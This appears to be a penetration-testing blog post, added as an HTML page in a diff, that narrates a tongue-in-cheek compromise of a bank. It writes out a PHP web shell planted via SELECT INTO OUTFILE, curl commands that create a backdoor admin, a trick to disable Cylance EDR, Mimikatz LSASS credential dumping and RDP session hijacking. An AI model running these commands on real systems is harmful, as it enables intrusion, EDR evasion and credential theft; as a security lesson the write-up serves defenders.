@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../img/favicon.ico" />
+    <title>How to Own a Bank - PentestDiaries</title>
+    <link rel="stylesheet" href="../css/theme.css" />
+    <link rel="stylesheet" href="../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "How to Own a Bank";
+        var mkdocs_page_input_path = "How_to_Own_a_Bank.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href=".." class="icon icon-home"> PentestDiaries
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Penetration Testing</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../ExploitingRDGatewayVuln/">Exploiting RD Gateway Vulnerability</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Exploiting_SMTP_Open_Relays/">Exploiting SMTP Open Relays</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">How to Own a Bank</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#the-setup-oops-we-left-everything-open">The Setup: "Oops, We Left Everything Open"</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#step-1-the-accidental-gift-directory-listing">Step 1: The Accidental Gift – Directory Listing</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-supprise">Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a supprise!</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#step-3-making-myself-at-home-persistence-101">Step 3: Making Myself at Home (Persistence 101)</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#step-4-fighting-cylance-edr-and-winning">Step 4: Fighting Cylance EDR (and Winning)</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#step-5-rdp-and-session-hijacking">Step 5: RDP and Session Hijacking</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#step-6-the-domain-controller-the-cyberark-pam-disaster">Step 6: The Domain Controller &amp; The CyberArk "PAM" Disaster</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#the-aftermath">The Aftermath</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#moral-of-the-story">Moral of the Story:</a>
+    </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Exploiting Vulnerabilities</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../MsExchangeInfoDisclosure/">Ms Exchange Info Disclosure</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../shadowIT/">Shadow IT</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../snmpGetBulk/">SNMP GetBulk</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="..">PentestDiaries</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href=".." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Penetration Testing</li>
+      <li class="breadcrumb-item active">How to Own a Bank</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="from-directory-listing-to-owning-a-bank-a-wild-ride-with-phpmyadmin-xampp-and-a-pam-that-didnt-give-a-damn">From Directory Listing to Owning a Bank: A Wild Ride with phpMyAdmin, XAMPP, and a PAM that Didn't Give a Damn</h1>
+<h2 id="the-setup-oops-we-left-everything-open">The Setup: "Oops, We Left Everything Open"</h2>
+<p>So there I was, minding my own business (aka breaking into a bank’s network for <em>totally legal</em> reasons), when I stumbled upon a webserver running XAMPP on a <strong>fully patched</strong> Windows Server. At first, I thought, "Okay, maybe they actually know what they're doing." Then, I ran <code>dirb</code> and found <em>directory listing</em> enabled. <strong>Rookie mistake #1.</strong></p>
+<h3 id="step-1-the-accidental-gift-directory-listing">Step 1: The Accidental Gift – Directory Listing</h3>
+<p>It all started with a simple directory listing. Because why secure your webserver when you can just hand out your internal file structure to anyone with an internet connection? I ran:</p>
+<pre class="codehilite"><code class="language-bash">dirb http://targetbank.com/
+</code></pre>
+
+<p>Boom. A treasure trove of exposed files, including a /phpmyadmin/ folder. Classic.
+and I was in. <strong>Rookie mistake #2.</strong></p>
+<h3 id="step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-supprise">Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a supprise!</h3>
+<p>I took a gamble and tried the usual default credentials:</p>
+<pre class="codehilite"><code>Username: root
+Password: (blank)
+</code></pre>
+
+<p>Guess what? It worked. Because, of course, it did. 
+With full control over the database, I simply used <code>SELECT INTO OUTFILE</code> to write a <strong>PHP web shell</strong> directly into <code>htdocs</code>.</p>
+<pre class="codehilite"><code class="language-sql">SELECT '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' INTO OUTFILE 'C:/xampp/htdocs/shell.php';
+</code></pre>
+
+<p>Boom. Webshell live at <code>http://bankserver/shell.php</code>.</p>
+<h3 id="step-3-making-myself-at-home-persistence-101">Step 3: Making Myself at Home (Persistence 101)</h3>
+<p>Checking the privileges, I realized XAMPP was running under NT AUTHORITY\SYSTEM. Oh, this was going to be fun.<strong>Rookie mistake #3.</strong>
+And also, I wasn’t about to leave this beautiful new playground unprotected. So, using my webshell, I ran:</p>
+<pre class="codehilite"><code class="language-bash">curl &quot;http://targetbank.com/shell.php?cmd=net user pentester mysecurepassword /add&quot;
+curl &quot;http://targetbank.com/shell.php?cmd=net localgroup administrators pentester /add&quot;
+</code></pre>
+
+<p>BOOOOM!!! Hello, new local admin user.</p>
+<h3 id="step-4-fighting-cylance-edr-and-winning">Step 4: Fighting Cylance EDR (and Winning)</h3>
+<p>This is where things got even funnier. Every time I tried to run <strong>Mimikatz</strong>, Cylance EDR slapped me like an overprotective parent. So I tried stopping the service:</p>
+<pre class="codehilite"><code class="language-bash">sc stop Cylance
+</code></pre>
+
+<p><em>Cylance:</em> "LOL, you thought." The service was marked <strong>non-stoppable.</strong></p>
+<p>But guess what? I could still <strong>change the startup type</strong>:</p>
+<pre class="codehilite"><code class="language-bash">sc config Cylance start= demand
+</code></pre>
+
+<p>Now, I just needed to <strong>reboot the server.</strong> I used the good old "extended ping" trick to monitor when it was back:</p>
+<pre class="codehilite"><code class="language-bash">ping -t bankserver
+</code></pre>
+
+<p>As soon as it came online, I refreshed my webshell. This time, <strong>Mimikatz worked like a charm.</strong>
+With Mimikatz, I dumped the LSASS, downloaded it for offline paswword cracking, </p>
+<pre class="codehilite"><code class="language-bash">mimikatz# sekurlsa::minidump lsass.dmp
+</code></pre>
+
+<h3 id="step-5-rdp-and-session-hijacking">Step 5: RDP and Session Hijacking</h3>
+<p>Since this part now fell under the the greybox part of the assessment, I politely (read: strategically) asked them to allow my RDP traffic through the firewall. Once I was in, I used the persistent account I had created earlier:</p>
+<pre class="codehilite"><code class="language-bash">rdesktop -u pentester -p mysecurepassword targetbank.com
+</code></pre>
+
+<p>Once in, I used <strong>PsExec</strong> to elevate myself to SYSTEM:</p>
+<pre class="codehilite"><code class="language-bash">PsExec.exe -s -i cmd.exe
+</code></pre>
+
+<p>And ran:</p>
+<pre class="codehilite"><code class="language-bash">query session
+</code></pre>
+
+<p>Guess what? <strong>Administrator</strong> left their session inactive but open. <strong>Rookie mistake #4.</strong>
+I could not let it like this without Hijacking it.</p>
+<pre class="codehilite"><code class="language-bash">tscon 2 /dest:console
+</code></pre>
+
+<p>And boom—Administrator session hijacked. But then… poof! I got kicked out. For some obscure reason, my session got terminated. Maybe someone noticed, maybe it was just dumb luck, but I had to go back to my LSASS dump.</p>
+<p>So, I cracked the dump offline:</p>
+<pre class="codehilite"><code class="language-bash">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords&quot; exit
+</code></pre>
+
+<p>or using Linux:</p>
+<pre class="codehilite"><code class="language-bash">pypykatz lsa minidump lsass.dmp
+</code></pre>
+
+<p>And got creds for BankAdmin1, a local admin account used on multiple critical servers.(because why follow best practices, right?)</p>
+<h3 id="step-6-the-domain-controller-the-cyberark-pam-disaster">Step 6: The Domain Controller &amp; The CyberArk "PAM" Disaster</h3>
+<p>While moving laterally, I hit the <strong>Domain Controller.</strong> This is where things took an unexpected turn. I also found a <strong>network-mounted drive</strong> on the initial compromised machine containing <strong>a plaintext file with a URL to their PAM (CyberArk).</strong> 🤦</p>
+<p>So, being the responsible hacker I am, I:
+    - Used the credentials obtained from LSASS dump cracking.
+    - Logged into the Domain Controller.
+    - Created a domain admin account.
+    - Added special permissions to that account to be able to use the PAM.</p>
+<p>Then I logged into <strong>CyberArk</strong> with my shiny new domain admin account, and... oh boy. <strong>It gave me access to the core banking system.</strong> 
+Because why have proper access controls when you can just let your pentester waltz right in?</p>
+<p><em>Insert evil laughter here.</em></p>
+<h2 id="the-aftermath">The Aftermath</h2>
+<p>At this point, I basically had the <strong>keys to the kingdom.</strong> This entire chain of failures was due to a mix of:
+1. <strong>Directory listing enabled</strong>
+2. <strong>phpMyAdmin with default creds</strong>
+3. <strong>XAMPP running as SYSTEM</strong>
+4. <strong>EDR that I could disable with a simple restart</strong>
+5. <strong>A bank that stored their own security tool URLs in a plaintext file</strong>
+6. <strong>Domain-wide local admin credentials</strong></p>
+<p><strong>If this wasn’t a real pentest, it would have made a fantastic heist movie.</strong></p>
+<h2 id="moral-of-the-story">Moral of the Story:</h2>
+<p>Secure your systems, disable default credentials, and please don’t leave your privileged accounts lying around. Otherwise, you’ll end up reading about your security failures in a blog post like this. 😏</p>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../Exploiting_SMTP_Open_Relays/" class="btn btn-neutral float-left" title="Exploiting SMTP Open Relays"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../MsExchangeInfoDisclosure/" class="btn btn-neutral float-right" title="Ms Exchange Info Disclosure">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../Exploiting_SMTP_Open_Relays/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../MsExchangeInfoDisclosure/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "..";</script>
+    <script src="../js/theme_extra.js"></script>
+    <script src="../js/theme.js"></script>
+      <script src="../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
